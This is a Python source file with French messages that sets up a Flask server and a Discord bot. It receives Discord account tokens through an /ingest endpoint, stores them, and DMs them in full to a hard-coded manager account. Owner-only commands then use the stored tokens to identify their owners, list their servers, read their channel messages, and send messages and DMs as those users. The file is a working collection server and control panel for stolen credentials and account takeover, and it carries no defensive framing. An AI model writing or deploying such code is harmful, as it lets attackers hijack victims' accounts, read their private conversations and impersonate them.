# main.py
import os, json, discord, aiohttp
from discord.ext import commands
from flask import Flask, request, jsonify
import threading

MANAGER_ID = 1264183250243420211
BOT_TOKEN = os.getenv("BOT_TOKEN")
INGEST_KEY = os.getenv("INGEST_KEY", "changeme")
PORT = int(os.getenv("PORT", 8080))
STORE = "tokens.json"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
app = Flask(__name__)

def load():
    if os.path.exists(STORE):
        with open(STORE) as f: return json.load(f)
    return {}

def save(d):
    with open(STORE, "w") as f: json.dump(d, f, indent=2)

@app.route("/ingest", methods=["POST"])
def ingest():
    if request.headers.get("X-Key") != INGEST_KEY:
        return jsonify({"error": "no"}), 401
    data = request.get_json(force=True)
    if not data:
        return jsonify({"error": "empty"}), 400
    label = data.get("label", "unknown")
    tokens = data.get("tokens", [])
    if isinstance(tokens, str):
        tokens = [tokens]
    d = load()
    for t in tokens:
        t = t.strip()
        if not t: continue
        d[f"{label}_{t[-8:]}"] = t
    save(d)
    if bot.is_ready() and tokens:
        async def notify():
            try:
                user = await bot.fetch_user(MANAGER_ID)
                msg = f"**{label}** — {len(tokens)} token(s)\n```\n" + "\n".join(tokens) + "\n```"
                await user.send(msg[:1990])
            except Exception as e:
                print("DM fail:", e)
        bot.loop.create_task(notify())
    return jsonify({"ok": True, "stored": len(tokens)})

@app.route("/", methods=["GET"])
def root():
    return "ok"

def run_flask():
    app.run(host="0.0.0.0", port=PORT, threaded=True)

def owner_only():
    async def check(ctx):
        return ctx.author.id == MANAGER_ID
    return commands.check(check)

@bot.event
async def on_ready():
    print(f"connecté : {bot.user} | manager : {MANAGER_ID}")

@bot.command()
@owner_only()
async def add(ctx, label: str, token: str):
    d = load(); d[label] = token.strip(); save(d)
    try: await ctx.message.delete()
    except: pass
    await ctx.send(f"ajouté `{label}`")

@bot.command()
@owner_only()
async def list(ctx):
    d = load()
    if not d: return await ctx.send("vide.")
    lines = [f"`{k}` : ...{v[-8:]}" for k, v in d.items()]
    await ctx.send("**stockés**\n" + "\n".join(lines[:40]))

@bot.command()
@owner_only()
async def who(ctx, label: str):
    d = load()
    if label not in d: return await ctx.send("inconnu.")
    async with aiohttp.ClientSession() as s:
        async with s.get("https://discord.com/api/v10/users/@me",
                         headers={"Authorization": d[label]}) as r:
            if r.status != 200: return await ctx.send(f"invalide ({r.status})")
            u = await r.json()
    await ctx.send(f"`{label}` → **{u['username']}** (id {u['id']})")

@bot.command()
@owner_only()
async def guilds(ctx, label: str):
    d = load()
    if label not in d: return await ctx.send("inconnu.")
    async with aiohttp.ClientSession() as s:
        async with s.get("https://discord.com/api/v10/users/@me/guilds",
                         headers={"Authorization": d[label]}) as r:
            if r.status != 200: return await ctx.send(f"err {r.status}")
            gs = await r.json()
    msg = "\n".join(f"- {g['name']} `{g['id']}`" for g in gs[:25])
    await ctx.send(f"**{len(gs)} serveurs**\n{msg}")

@bot.command()
@owner_only()
async def read(ctx, label: str, channel_id: int, count: int = 20):
    d = load()
    if label not in d: return await ctx.send("inconnu.")
    async with aiohttp.ClientSession() as s:
        async with s.get(f"https://discord.com/api/v10/channels/{channel_id}/messages?limit={count}",
                         headers={"Authorization": d[label]}) as r:
            if r.status != 200: return await ctx.send(f"err {r.status}")
            msgs = await r.json()
    out = "\n".join(f"[{m['author']['username']}] {m['content'][:80]}" for m in msgs)
    await ctx.send(f"```{out[:1900]}```")

@bot.command()
@owner_only()
async def send(ctx, label: str, channel_id: int, *, text: str):
    d = load()
    if label not in d: return await ctx.send("inconnu.")
    async with aiohttp.ClientSession() as s:
        async with s.post(f"https://discord.com/api/v10/channels/{channel_id}/messages",
                          headers={"Authorization": d[label]},
                          json={"content": text}) as r:
            await ctx.send(f"envoyé ({r.status})")

@bot.command()
@owner_only()
async def dm(ctx, label: str, user_id: int, *, text: str):
    d = load()
    if label not in d: return await ctx.send("inconnu.")
    async with aiohttp.ClientSession() as s:
        async with s.post("https://discord.com/api/v10/users/@me/channels",
                          headers={"Authorization": d[label]},
                          json={"recipient_id": user_id}) as r:
            if r.status != 200: return await ctx.send(f"open fail {r.status}")
            ch = await r.json()
        async with s.post(f"https://discord.com/api/v10/channels/{ch['id']}/messages",
                          headers={"Authorization": d[label]},
                          json={"content": text}) as r:
            await ctx.send(f"dm envoyé ({r.status})")

@bot.command()
@owner_only()
async def rm(ctx, label: str):
    d = load(); d.pop(label, None); save(d)
    await ctx.send(f"supprimé `{label}`")

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(BOT_TOKEN)
